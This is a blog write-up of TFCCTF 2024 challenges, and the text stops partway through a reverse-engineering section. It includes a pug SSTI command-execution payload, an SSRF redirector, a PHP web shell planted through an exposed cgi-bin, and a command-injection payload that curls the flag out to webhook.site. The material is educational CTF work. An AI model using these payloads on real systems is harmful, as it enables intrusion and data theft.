<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
  <meta name="generator" content="Jekyll">

  <title>TFCCTF 2024 Writeup</title>

  <link rel="stylesheet" href="/css/main.css">
  
  <link href="/atom.xml" type="application/atom+xml" rel="alternate" title="ATOM Feed" /> <!-- Begin Jekyll SEO tag v2.8.0 -->
<title>TFCCTF 2024 Writeup | grep-user blog</title>
<meta name="generator" content="Jekyll v3.9.3" />
<meta property="og:title" content="TFCCTF 2024 Writeup" />
<meta name="author" content="grep-user" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="Hi guys, This weekend I attended TFC CTF which was fun and I learnt a lot of new things. Also I tried most of the web challenges but able to complete only one. But in this writeup I am going to discuss about other challenges and their solutions from discord. The challege I solved is Safe_Content ,a medium web challenge." />
<meta property="og:description" content="Hi guys, This weekend I attended TFC CTF which was fun and I learnt a lot of new things. Also I tried most of the web challenges but able to complete only one. But in this writeup I am going to discuss about other challenges and their solutions from discord. The challege I solved is Safe_Content ,a medium web challenge." />
<link rel="canonical" href="http://localhost:8001/TFC-CTF-Writeup" />
<meta property="og:url" content="http://localhost:8001/TFC-CTF-Writeup" />
<meta property="og:site_name" content="grep-user blog" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2024-08-04T00:00:00+05:30" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="TFCCTF 2024 Writeup" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"grep-user","url":"https://grep-user.github.io"},"dateModified":"2024-08-04T00:00:00+05:30","datePublished":"2024-08-04T00:00:00+05:30","description":"Hi guys, This weekend I attended TFC CTF which was fun and I learnt a lot of new things. Also I tried most of the web challenges but able to complete only one. But in this writeup I am going to discuss about other challenges and their solutions from discord. The challege I solved is Safe_Content ,a medium web challenge.","headline":"TFCCTF 2024 Writeup","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:8001/TFC-CTF-Writeup"},"url":"http://localhost:8001/TFC-CTF-Writeup"}</script>
<!-- End Jekyll SEO tag -->

</head>

<body>
  <div id="wrapper">
    <header>
  <div>
    <a href="/">
    
    <h1>grep-user@home:~$</h1>
    </a>
    <div class="header-links">
      <a href="/archive"><h2 class="header-link">Archive</h2></a>
<a href="/about"><h2 class="header-link">About</h2></a>
<a href="/atom.xml"><h2 class="header-link">RSS</h2></a>
    </div>
  </div>
</header>
    <div class="container">
      <section id="main_content">
        <article>
  <h2>TFCCTF 2024 Writeup</h2>
  <time datetime="2024-08-04T00:00:00+05:30" class="by-line">04 Aug 2024</time>
  <p>Hi guys, This weekend I attended <a href="https://ctftime.org/event/2423">TFC CTF</a> which was fun and I learnt a lot of new things. Also I tried most of the web challenges but able to complete only one. But in this writeup I am going to discuss about other challenges and their solutions from discord. The challege I solved is Safe_Content ,a medium web challenge.</p>

<h3 id="contents">Contents</h3>
<ul>
  <li>Greetings[Web]</li>
  <li>Surfing[Web]</li>
  <li>Funny[Web]</li>
  <li>Safe_Content[Web]</li>
  <li>license[Reverse]</li>
</ul>

<h3 id="greetings-web--warmup">Greetings [Web | Warmup]</h3>

<p>Yes, I didn’t solved this challenge during CTF. Basically we are given a web app which returns welcome message with our name. So the initially step is to test for SSTI and XSS. Xss worked but it was not an XSS challenge. For <a href="https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection">SSTI</a>,</p>

<p>I tried payloads like <code class="language-plaintext highlighter-rouge">${7*7}</code>,<code class="language-plaintext highlighter-rouge">{{7*7}}</code> but it never worked.Since it is blind challenge without source, I left it without solving. But After reviewing the solution, it turned out to be an SSTI challenge. The challenge uses node js for backend and it uses pugjs for templating.</p>

<h4 id="trick-alert">Trick Alert</h4>
<p><img src="../assets/2024/tfcctf/greetings1.png" alt="" /></p>

<p>Yes, entering URL encoded newline throws error revealing its using pugJs.</p>

<p><img src="../assets/2024/tfcctf/greetings2.png" alt="" /></p>

<p>From there its simple SSTI to rce bug to read flag from server.</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#{global.process.mainModule.constructor._load("child_process").execSync("cat flag.txt").toString()} 
</code></pre></div></div>

<p><img src="../assets/2024/tfcctf/greetings3.png" alt="" /></p>

<h3 id="surfing-web--easy">SURFING [Web | Easy]</h3>

<p>In this challenge we are given a input box which asks for <code class="language-plaintext highlighter-rouge">google.com</code> URL. It fetches the url content and displays the results. For example if we google search URL <em>https://www.google.com/search?q=example&amp;oq=example</em>, it fetches the entire page in json. So our obvious goal is to find SSRF[Since server accepts URL and returns response from URL]. On trying different domains like <em>example.com</em>, <em>evil.com</em>, the server throws error <code class="language-plaintext highlighter-rouge">Hacking detected, url must start with http://google.com/</code>. I tried open redirection using google URL. But its not easy to find, since we are talking about google.</p>

<p>Unable to solve this challenege too. After reading the writeup, it turned out to be a redirection vulnerability involving Google’s <a href="https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/trusted-domain-hidden-danger-deceptive-url-redirections-in-email-phishing-attacks/">URL</a>.</p>

<p><img src="../assets/2024/tfcctf/surfing3.png" alt="" /></p>

<p>According to the mentioned blog, the redirection to example.com will look like this <code class="language-plaintext highlighter-rouge">http://google.com/amp/s/example.com/#redacted@redacted</code>. What can we do this redirection, maybe SSRF!! .The redirection works for domain name like <em>example.com</em> ,<em>evil.com</em> .For SSRF we need something like localhost:{port} to redirect to localhost, But unforunately it didn’t worked like that. So the idea is to host a webapp which redirects to localhost or use URL shortener.</p>

<p>I have created a simple flask webapp and port forwarded using ngrok. Now when we redirect to ngrok using google URL it should redirect to <code class="language-plaintext highlighter-rouge">localhost</code> port 8000. For port number I thick we should brute force, since the challenge doesn’t have any hints representing the port number. Tiny URL’s will also work in this case to redirect to localhost.</p>

<h4 id="using-tiny-url">Using Tiny URL</h4>
<p><img src="../assets/2024/tfcctf/surfing4.png" alt="" /></p>

<h4 id="using-ngrok">Using ngrok</h4>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">request</span><span class="p">,</span><span class="n">Flask</span><span class="p">,</span><span class="n">redirect</span>

<span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="n">__name__</span><span class="p">)</span>

<span class="o">@</span><span class="n">app</span><span class="p">.</span><span class="n">route</span><span class="p">(</span><span class="s">'/'</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s">'GET'</span><span class="p">,</span> <span class="s">'POST'</span><span class="p">])</span>
<span class="k">def</span> <span class="nf">home</span><span class="p">():</span>
    <span class="k">if</span> <span class="n">request</span><span class="p">.</span><span class="n">method</span> <span class="o">==</span> <span class="s">'GET'</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="s">"http://localhost:8000"</span><span class="p">)</span>


<span class="k">if</span> <span class="n">__name__</span><span class="o">==</span><span class="s">"__main__"</span><span class="p">:</span>
    <span class="n">app</span><span class="p">.</span><span class="n">run</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="s">"0.0.0.0"</span><span class="p">,</span><span class="n">port</span><span class="o">=</span><span class="s">"9000"</span><span class="p">,</span><span class="n">debug</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>

</code></pre></div></div>

<p><img src="../assets/2024/tfcctf/surfing1.png" alt="" /></p>

<p>Now it is clear that the server has two applications, one flask web server for URL fetcher and PHP web server which is binded to localhost and has <code class="language-plaintext highlighter-rouge">admin.php</code>. From the respone it is clear we have to make a internal <em>GET</em> call to admin.php with username and password as <code class="language-plaintext highlighter-rouge">admin</code> to get the flag .So finally changing our <code class="language-plaintext highlighter-rouge">app.py</code> to redirect to <em>admin.php</em>.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># Changing the redirect alone 
def home():
    if request.method == 'GET':
        return redirect("http://localhost:8000/admin.php?username=admin&amp;password=admin")
</code></pre></div></div>

<p><img src="../assets/2024/tfcctf/surfing2.png" alt="" /></p>

<h3 id="funny-web--medium">Funny [Web | Medium]</h3>

<p>In this challenge we are given  given source and a simple php application which gets joke using <code class="language-plaintext highlighter-rouge">/new_joke</code> endpoint. So how to pwn this. On inspecting the Dockerfile we are sure that the application uses apache2 web server. The source also includes <code class="language-plaintext highlighter-rouge">httpd.conf</code> which has the http server’s configurations.</p>

<p>Every configuration looks fine but this one particular config looks weird</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ScriptAlias /cgi-bin /usr/bin
Action php-script /cgi-bin/php-cgi
AddHandler php-script .php

&lt;Directory /usr/bin&gt;
    Order allow,deny
    Allow from all
&lt;/Directory&gt;
</code></pre></div></div>

<p>This config allows anyone to run any binaries from <code class="language-plaintext highlighter-rouge">/usr/bin</code> using <code class="language-plaintext highlighter-rouge">/cgi-bin</code> route. So the solution is to use binaries like <code class="language-plaintext highlighter-rouge">wget</code>, <code class="language-plaintext highlighter-rouge">nc</code> or <code class="language-plaintext highlighter-rouge">tee</code> to achieve remote code execution.</p>

<p><img src="../assets/2024/tfcctf/funny2.png" alt="" /></p>

<p><code class="language-plaintext highlighter-rouge">wget</code> the php code <code class="language-plaintext highlighter-rouge">&lt;?php system($_GET["cmd"]); ?&gt;</code> to <code class="language-plaintext highlighter-rouge">/var/www/public</code> path to achieve classic RCE. Got this <code class="language-plaintext highlighter-rouge">tee</code> command based solution from discord which uses <strong>POST</strong> request to write file contents.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GET /cgi-bin/tee?/var/www/public/test.php HTTP/1.1
Host: localhost:1337
User-Agent: python-requests/2.32.3
Accept-Encoding: gzip, deflate, br
Accept: */*
Connection: keep-alive
Content-Length: 34

&lt;?php system($_GET["cmd"]); ?&gt;

GET /test.php?cmd=cat%20/flag.txt HTTP/1.1
Host: localhost:1337
User-Agent: python-requests/2.32.3
Accept-Encoding: gzip, deflate, br
Accept: */*
Connection: keep-alive
Content-Length: 34
</code></pre></div></div>

<p><img src="../assets/2024/tfcctf/funny1.png" alt="" /></p>

<h3 id="safe_content-web--medium">Safe_Content [Web | Medium]</h3>

<p>This it the only challenge I solved. The challenge is same like surfing challenge which accepts URL as input. But the twist here is that while URL parsing it accepts the URL only if the host part of the URL contains <code class="language-plaintext highlighter-rouge">localhost</code>. The entire application source code is as follows.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;?php

    function isAllowedIP($url, $allowedHost) {
        $parsedUrl = parse_url($url);
        
        if (!$parsedUrl || !isset($parsedUrl['host'])) {
            return false;
        }
        
        return $parsedUrl['host'] === $allowedHost;
    }

    function fetchContent($url) {
        $context = stream_context_create([
            'http' =&gt; [
                'timeout' =&gt; 5 // Timeout in seconds
            ]
        ]);

        $content = @file_get_contents($url, false, $context);
        if ($content === FALSE) {
            $error = error_get_last();
            throw new Exception("Unable to fetch content from the URL. Error: " . $error['message']);
        }
        return base64_decode($content);
    }

    if ($_SERVER['REQUEST_METHOD'] === 'GET' &amp;&amp; isset($_GET['url'])) {
        $url = $_GET['url'];
        $allowedIP = 'localhost';
        
        if (isAllowedIP($url, $allowedIP)) {
            $content = fetchContent($url);
            // file upload removed due to security issues
            if ($content) {
                $command = 'echo ' . $content . ' | base64 &gt; /tmp/' . date('YmdHis') . '.tfc';
                exec($command . ' &gt; /dev/null 2&gt;&amp;1');
                // this should fix it
            }
        }
    }
    ?&gt;
</code></pre></div></div>

<p>So we need to bypass the <code class="language-plaintext highlighter-rouge">isAllowedIP</code> method check and also make URL return contents such that it escapes the <code class="language-plaintext highlighter-rouge">command</code> while executing it.Data URL is the saviuor here, with which we can bypass <code class="language-plaintext highlighter-rouge">localhost</code> check and retunr <code class="language-plaintext highlighter-rouge">HTML</code> content. Since <em>fetchContent</em> method returns Base64 decoded content, we need to base64 encode our contents</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#payload
&amp;&amp;curl webhook.site/cd422221-7ea9-44f2-bf5a-416cc2ef6350?q=$(cat /flag.txt | base64 | tr -d "\n")

#encoding it in data URL
data://localhost/text/html,JiZjdXJsIDFhY2QxeHh5ZTlwZ295ajloanVocWM2OGV6a3E4dHdpLm9hc3RpZnkuY29tP3E9JChjYXQgL2ZsYWcudHh0IHwgYmFzZTY0IHwgdHIgLWQgIlxuIik=
</code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> curl -X $'GET' $'http://challs.tfcctf.com:32706/?url=data://localhost/text/html,JiZjdXJsIDFhY2QxeHh5ZTlwZ295ajloanVocWM2OGV6a3E4dHdpLm9hc3RpZnkuY29tP3E9JChjYXQgL2ZsYWcudHh0IHwgYmFzZTY0IHwgdHIgLWQgIlxuIik='
</code></pre></div></div>

<p><img src="../assets/2024/tfcctf/safe_content2.png" alt="" /></p>

<h3 id="license-reverse--warmup">License [Reverse | Warmup]</h3>

<p>As the name suggests, the goal of this challenge is to find the license key of the binary. Unfortunately I didn’t solved it during CTF, but for learning Reverse engineering I took this challenge and solved it after few days.</p>

<p>Below is the disassembled main function.</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span>
  <span class="kt">int</span> <span class="n">iVar1</span><span class="p">;</span>
  <span class="kt">size_t</span> <span class="n">sVar2</span><span class="p">;</span>
  
  <span class="n">puts</span><span class="p">(</span><span class="s">"Please enter your license key to use this program!"</span><span class="p">);</span>
  <span class="n">fgets</span><span class="p">(</span><span class="o">&amp;</span><span class="n">DAT_00104060</span><span class="p">,</span><span class="mh">0x12</span><span class="p">,</span><span class="n">stdin</span><span class="p">);</span>
  <span class="n">sVar2</span> <span class="o">=</span> <span class="n">strlen</span><span class="p">(</span><span class="o">&amp;</span><span class="n">DAT_00104060</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">sVar2</span> <span class="o">!=</span> <span class="mi">17</span><span class="p">)</span> <span class="p">{</span>
                    <span class="cm">/* WARNING: Subroutine does not return */</span>
    <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
  <span class="p">}</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">cRam0000000000104070</span> <span class="o">==</span> <span class="sc">'\n'</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">cRam0000000000104070</span> <span class="o">=</span> <span class="sc">'\0'</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="n">strncpy</span><span class="p">(</span><span class="o">&amp;</span><span class="n">DAT_00104080</span><span class="p">,</span><span class="o">&amp;</span><span class="n">DAT_00104060</span><span class="p">,</span><span class="mi">8</span><span class="p">);</span>
  <span class="n">DAT_00104088</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="n">iVar1</span> <span class="o">=</span> <span class="n">FUN_00101209</span><span class="p">(</span><span class="o">&amp;</span><span class="n">DAT_00104080</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">iVar1</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">puts</span><span class="p">(</span><span class="s">"Nope"</span><span class="p">);</span>
                    <span class="cm">/* WARNING: Subroutine does not return */</span>
    <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
  <span class="p">}</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">DAT_00104068</span> <span class="o">!=</span> <span class="sc">'-'</span><span class="p">)</span> <span class="p">{</span>
                    <span class="cm">/* WARNING: Subroutine does not return */</span>
    <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
  <span class="p">}</span>
  <span class="n">strncpy</span><span class="p">(</span><span class="o">&amp;</span><span class="n">DAT_00104090</span><span class="p">,</span><span class="o">&amp;</span><span class="n">DAT_00104069</span><span class="p">,</span><span class="mi">8</span><span class="p">);</span>
  <span class="n">iVar1</span> <span class="o">=</span> <span class="n">FUN_00101345</span><span class="p">(</span><span class="o">&amp;</span><span class="n">DAT_00104090</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">iVar1</span> <span class="o">!=</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">puts</span><span class="p">(</span><span class="s">"Congrats! Get the flag on remote."</span><span class="p">);</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="n">puts</span><span class="p">(</span><span class="s">"Nope"</span><span class="p">);</span>
                    <span class="cm">/* WARNING: Subroutine does not return */</span>
  <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>

<p>The license key is checked in two functions , initiallly it is checked for lenght. So the length of license should be 17. And then it goes through two functions. Lets consider <code class="language-plaintext highlighter-rouge">FUN_00101209</code> as function_one and <code class="language-plaintext highlighter-rouge">FUN_00101345</code> as function_two respectively. function_one’s disassembled code is</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">undefined8</span> <span class="nf">FUN_00101209</span><span class="p">(</span><span class="kt">long</span> <span class="n">param_1</span><span class="p">)</span>
<span class="p">{</span>
  <span class="kt">int</span> <span class="n">remainder</span><span class="p">;</span>
  <span class="n">undefined8</span> <span class="n">uVar1</span><span class="p">;</span>
  <span class="kt">long</span> <span class="n">in_FS_OFFSET</span><span class="p">;</span>
  <span class="kt">int</span> <span class="n">i</span><span class="p">;</span>
  <span class="kt">int</span> <span class="n">j</span><span class="p">;</span>
  <span class="n">byte</span> <span class="n">dummy_var</span> <span class="p">[</span><span class="mi">8</span><span class="p">];</span>
  <span class="kt">long</span> <span class="n">local_10</span><span class="p">;</span>
  
  <span class="n">local_10</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">in_FS_OFFSET</span> <span class="o">+</span> <span class="mh">0x28</span><span class="p">);</span>
  <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">8</span><span class="p">;</span> <span class="n">i</span> <span class="o">=</span> <span class="n">i</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">remainder</span> <span class="o">=</span> <span class="n">i</span> <span class="o">%</span> <span class="mi">3</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">remainder</span> <span class="o">==</span> <span class="mi">2</span><span class="p">)</span> <span class="p">{</span>
      <span class="n">dummy_var</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)(</span><span class="n">param_1</span> <span class="o">+</span> <span class="n">i</span><span class="p">)</span> <span class="o">-</span> <span class="mi">37</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">remainder</span> <span class="o">&lt;</span> <span class="mi">3</span><span class="p">)</span> <span class="p">{</span>
      <span class="k">if</span> <span class="p">(</span><span class="n">remainder</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">dummy_var</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="n">byte</span> <span class="o">*</span><span class="p">)(</span><span class="n">param_1</span> <span class="o">+</span> <span class="n">i</span><span class="p">)</span> <span class="o">^</span> <span class="mh">0x5a</span><span class="p">;</span>
      <span class="p">}</span>
      <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">remainder</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">dummy_var</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)(</span><span class="n">param_1</span> <span class="o">+</span> <span class="n">i</span><span class="p">)</span> <span class="o">+</span> <span class="mi">16</span><span class="p">;</span>
      <span class="p">}</span>
    <span class="p">}</span>
    <span class="n">dummy_var</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">dummy_var</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^</span> <span class="mh">0x33</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="n">j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="k">do</span> <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="mi">7</span> <span class="o">&lt;</span> <span class="n">j</span><span class="p">)</span> <span class="p">{</span>
      <span class="n">uVar1</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
<span class="nl">LAB_0010132f:</span>
      <span class="k">if</span> <span class="p">(</span><span class="n">local_10</span> <span class="o">==</span> <span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">in_FS_OFFSET</span> <span class="o">+</span> <span class="mh">0x28</span><span class="p">))</span> <span class="p">{</span>
        <span class="k">return</span> <span class="n">uVar1</span><span class="p">;</span>
      <span class="p">}</span>
                    <span class="cm">/* WARNING: Subroutine does not return */</span>
      <span class="n">__stack_chk_fail</span><span class="p">();</span>
    <span class="p">}</span>
    <span class="k">if</span> <span class="p">((</span><span class="n">uint</span><span class="p">)</span><span class="n">dummy_var</span><span class="p">[</span><span class="n">j</span><span class="p">]</span> <span class="o">!=</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="s">"Xsl3BDxP"</span><span class="p">[</span><span class="n">j</span><span class="p">])</span> <span class="p">{</span>
      <span class="n">uVar1</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
      <span class="k">goto</span> <span class="n">LAB_0010132f</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="n">j</span> <span class="o">=</span> <span class="n">j</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
  <span class="p">}</span> <span class="k">while</span><span class="p">(</span> <span class="nb">true</span> <span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>

<p>Lets solve function_one, so here the first 8 bytes of license are passed as arguments and checked. The first eight bytes go through some arithmetic and xor operations and checked with string <code class="language-plaintext highlighter-rouge">Xsl3BDxP</code>. This can be easily reversed using the below script.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">find1</span><span class="p">(</span><span class="n">first_known_bytes</span><span class="p">):</span>
    <span class="n">to_find</span> <span class="o">=</span> <span class="nb">bytearray</span><span class="p">(</span><span class="mi">8</span><span class="p">)</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">first_known_bytes</span><span class="p">)):</span>
        <span class="n">to_find</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="nb">ord</span><span class="p">(</span><span class="n">first_known_bytes</span><span class="p">[</span><span class="n">i</span><span class="p">])</span> <span class="o">^</span> <span class="mi">51</span>
        <span class="k">if</span> <span class="n">i</span><span class="o">%</span><span class="mi">3</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
            <span class="c1">#If 3 modulus of index is 0 then it is xored with 90.
</span>            <span class="n">to_find</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">to_find</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^</span> <span class="mi">90</span>
        <span class="k">elif</span> <span class="n">i</span><span class="o">%</span><span class="mi">3</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
            <span class="c1">#If 3 modulus of index is 1 then it is added with 16.
</span>            <span class="n">to_find</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">to_find</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">-</span><span class="mi">16</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="c1">#If 3 modulus of index is 1 then it is subtracted with 37.
</span>            <span class="n">to_find</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">to_find</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">+</span><span class="mi">37</span>
    <span class="k">return</span> <span class="n">to_find</span>

<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">'__main__'</span><span class="p">:</span>
    <span class="n">first_known_bytes</span> <span class="o">=</span> <span class="s">"Xsl3BDxP"</span>
    <span class="c1"># the seventh byte is checked for character '-'
</span>    <span class="n">ans</span> <span class="o">=</span> <span class="n">find1</span><span class="p">(</span><span class="n">first_known_bytes</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="s">'-'</span>
    <span class="k">print</span><span class="p">(</span><span class="n">ans</span><span class="p">)</span>
</code></pre></div></div>

<p>Function_two’s disassembled code is</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">undefined8</span> <span class="nf">FUN_00101345</span><span class="p">(</span><span class="kt">long</span> <span class="n">param_1</span><span class="p">)</span>
<span class="p">{</span>
  <span class="kt">int</span> <span class="n">inter_int</span><span class="p">;</span>
  <span class="n">ushort</span> <span class="o">**</span><span class="n">ppuVar1</span><span class="p">;</span>
  <span class="kt">int</span> <span class="n">j</span><span class="p">;</span>
  <span class="kt">int</span> <span class="n">local_c</span><span class="p">;</span>
  
  <span class="k">for</span> <span class="p">(</span><span class="n">j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">j</span> <span class="o">&lt;</span> <span class="mi">8</span><span class="p">;</span> <span class="n">j</span> <span class="o">=</span> <span class="n">j</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">ppuVar1</span> <span class="o">=</span> <span class="n">__ctype_b_loc</span><span class="p">();</span>
    <span class="k">if</span> <span class="p">(((</span><span class="o">*</span><span class="n">ppuVar1</span><span class="p">)[</span><span class="o">*</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)(</span><span class="n">param_1</span> <span class="o">+</span> <span class="n">j</span><span class="p">)]</span> <span class="o">&amp;</span> <span class="mh">0x200</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
      <span class="n">ppuVar1</span> <span class="o">=</span> <span class="n">__ctype_b_loc</span><span class="p">();</span>
      <span class="k">if</span> <span class="p">(((</span><span class="o">*</span><span class="n">ppuVar1</span><span class="p">)[</span><span class="o">*</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)(</span><span class="n">param_1</span> <span class="o">+</span> <span class="n">j</span><span class="p">)]</span> <span class="o">&amp;</span> <span class="mh">0x100</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">inter_int</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)(</span><span class="n">param_1</span> <span class="o">+</span> <span class="n">j</span><span class="p">)</span> <span class="o">+</span> <span class="o">-</span><span class="mh">0x30</span><span class="p">;</span>
        <span class="o">*</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)(</span><span class="n">param_1</span> <span class="o">+</span> <span class="n">j</span><span class="p">)</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span><span class="p">)</span><span class="n">inter_int</span> <span class="o">+</span> <span class="p">(</span><span class="kt">char</span><span class="p">)(</span><span class="n">inter_int</span> <span class="o">/</span> <span class="mh">0x1a</span><span class="p">)</span> <span class="o">*</span> <span class="o">-</span><span class="mh">0x1a</span> <span class="o">+</span> <span class="sc">'A'</span><span class="p">;</span>
      <span class="p">}</span>
    <span class="p">}</span>
    <span class="k">else</span> <span class="p">{</span>
      <span class="n">inter_int</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)(</span><span class="n">param_1</span> <span class="o">+</span> <span class="n">j</span><span class="p">)</span> <span class="o">+</span> <span class="o">-</span><span class="mh">0x5c</span><span class="p">;</span>
      <span class="o">*</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)(</span><span class="n">param_1</span> <span class="o">+</span> <span class="n">j</span><span class="p">)</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span><span class="p">)</span><span class="n">inter_int</span> <span class="o">+</span> <span class="p">(</span><span class="kt">char</span><span class="p">)(</span><span class="n">inter_int</span> <span class="o">/</span> <span class="mh">0x1a</span><span class="p">)</span> <span class="o">*</span> <span class="o">-</span><span class="mh">0x1a</span> <span class="o">+</span> <span class="sc">'a'</span><span class="p">;</span>
    <span class="p">}</span>
  <span class="p">}</span>
  <span class="n">local_c</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="k">while</span><span class="p">(</span> <span class="nb">true</span> <span class="p">)</span> <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="mi">7</span> <span class="o">&lt;</span> <span class="n">local_c</span><span class="p">)</span> <span class="p">{</span>
      <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
    <span class="p">}</span>
